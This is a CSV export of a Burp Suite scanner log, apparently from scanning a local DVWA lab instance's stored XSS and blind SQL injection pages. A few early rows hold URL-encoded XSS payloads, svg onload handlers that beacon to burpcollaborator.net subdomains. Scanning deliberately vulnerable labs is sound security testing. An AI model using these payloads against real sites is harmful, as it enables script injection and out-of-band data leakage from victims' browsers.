Number,Complete,Tool,Host,Method,Path,Query,Params,Status,ResponseLength,MimeType,UrlExtension,Comment,IsSSL,NewCookies,RequestTime,ResponseTime,ResponseDelay,ListenerInterface,Regex1Req,Regex1Resp,
0,true,Scanner,http://localhost,POST,/vulnerabilities/xss_s/,javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2f75a0xyo2unpu0v2zbfrrg3dj9af13tuho4fs4%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1,true,302,0,HTML,,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,5ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/xss_s/index.php,,false,200,5676,HTML,php,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,10ms,,Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/xss_s/,,true,302,0,HTML,,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,16ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/xss_s/,,true,302,0,HTML,,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,24ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/xss_s/index.php,,false,200,5726,HTML,php,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,29ms,,Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/xss_s/,,true,302,0,HTML,,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,36ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/xss_s/index.php,,false,200,5676,HTML,php,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,44ms,,Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/xss_s/,,true,302,0,HTML,,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,50ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/xss_s/,,true,302,0,HTML,,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,56ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/xss_s/index.php,,false,200,5726,HTML,php,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,63ms,,Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/xss_s/,,true,302,0,HTML,,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,72ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/xss_s/index.php,,false,200,5676,HTML,php,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,79ms,,Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/tkhmck3o994gfhhlq16dvps5owunifa37qxem/,,true,404,328,HTML,,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,85ms,,404 Not Found
0,true,Scanner,http://localhost,POST,/vulnerabilities/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//yxzrppgtmehlsmuq36ji8u5a117svkl8iv8jx%5c56burpcollaborator.net'%3e/,,true,404,402,HTML,,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,89ms,,404 Not Found
0,true,Scanner,http://localhost,POST,/vulnerabilities/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/nwngoefil3garbtf2vi77j4z0q6hu9lxik88x%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e/,,true,404,481,HTML,,,false,,2018/05/16 00:27:42,2018/05/16 00:27:42,94ms,,404 Not Found
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/index.php,,false,200,5259,HTML,php,,false,,2018/05/16 00:27:44,2018/05/16 00:27:44,971ms,,Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/index.php,,false,200,5259,HTML,php,,false,,2018/05/16 00:27:44,2018/05/16 00:27:44,976ms,,Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/index.php,,false,302,0,HTML,php,,false,,2018/05/16 00:27:44,2018/05/16 00:27:44,986ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:27:44,2018/05/16 00:27:44,991ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/index.php,,false,302,0,HTML,php,,false,,2018/05/16 00:27:44,2018/05/16 00:27:44,996ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:27:45,2018/05/16 00:27:45,2ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/index.php,,false,302,0,HTML,php,,false,PHPSESSID=eo5hva0balo94jijn62jdof162; ,2018/05/16 00:27:45,2018/05/16 00:27:45,6ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:27:45,2018/05/16 00:27:45,12ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/index.php,,false,302,0,HTML,php,,false,PHPSESSID=jjoppu3kr6uos7v7askgeoo4a5; ,2018/05/16 00:27:45,2018/05/16 00:27:45,17ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:27:45,2018/05/16 00:27:45,22ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/index.php,,false,302,0,HTML,php,,false,PHPSESSID=n3pos3sbsik3pqn6r8vlr8umk3; ,2018/05/16 00:27:45,2018/05/16 00:27:45,26ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:27:45,2018/05/16 00:27:45,31ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/index.php,,false,302,0,HTML,php,,false,PHPSESSID=cneegg40tugve0tirc3sa3i134; ,2018/05/16 00:27:45,2018/05/16 00:27:45,34ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:27:45,2018/05/16 00:27:45,39ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/index.php,,false,302,0,HTML,php,,false,PHPSESSID=734u4qjuj91ist07m4udaqbsb2; ,2018/05/16 00:27:45,2018/05/16 00:27:45,43ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:27:45,2018/05/16 00:27:45,48ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/index.php,,false,302,0,HTML,php,,false,PHPSESSID=8bctdmrb77n9pg2mk971dhjh40; ,2018/05/16 00:27:45,2018/05/16 00:27:45,52ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:27:45,2018/05/16 00:27:45,57ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/index.php,,false,302,0,HTML,php,,false,PHPSESSID=vt3cevfn3sut2ori61l83dpbl7; ,2018/05/16 00:27:45,2018/05/16 00:27:45,63ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli_blind/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:27:45,2018/05/16 00:27:45,68ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
